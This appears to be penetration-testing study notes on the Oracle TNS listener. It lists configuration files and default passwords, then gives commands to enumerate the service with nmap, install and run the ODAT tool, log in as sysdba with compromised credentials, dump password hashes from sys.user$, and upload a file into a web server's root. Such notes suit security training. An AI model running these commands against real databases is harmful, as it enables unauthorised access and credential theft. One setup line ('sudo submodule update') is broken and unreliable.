# Oracle TNS

Oracle TNS = Oracle Transparent Network Substrate

Communication protocol between Oracle databases and applications over networks.

It supports IPX/SPX, UDP and TCP/IP protocol stacks.

- built-in encryption
- support IPv6 and SSL/TLS

Default port : TCP/1521


# Configuration

Configuration files located on the listener Oracle TNS server :
- client-side Oracle Net Services software : ORACLE_HOME/network/admin/tnsnames.ora
    resolve service names to network addresses
- listener process : ORACLE_HOME/network/admin/listener.ora
    determine the services it should listen to and the behavior of the listener

Oracle 9 : default password "CHANGE_ON_INSTALL"
Oracle 10 : no default password

Oracle DBSNMP : default password "dbsnmp"

\$ORACLE_HOME/sqldeveloper/PlsqlExclusionList : packages or types that should be excluded from execution

## Interesting parameters 


# Footprinting the service

## Enumeration

sudo nmap -p1521 -sV $TARGET --open

## Oracle-Tools-setup.sh

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
sudo submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete

## Interaction

cd odat/
./odat.py -h
./odat.py all -s $TARGET

sqlplus user/password@$TARGET/XE;

If sqlplus: error

sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

sqlplus $user/$password@$TARGET/XE;

select table_name from all_tables;
select * from user_role_privs;

## Interaction as sysdba


Using a compromised account to log in as the System Database Admin (sysdba) :
sqlplus $user/$password@$TARGET/XE as sysdba

select name, password from sys.user$;

## Upload file

echo "Oracle File Upload Test" > testing.txt

/odat.py utlfile -s $TARGET -d XE -U $user -P $password --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

curl -X GET http://$TARGET/testing.txt
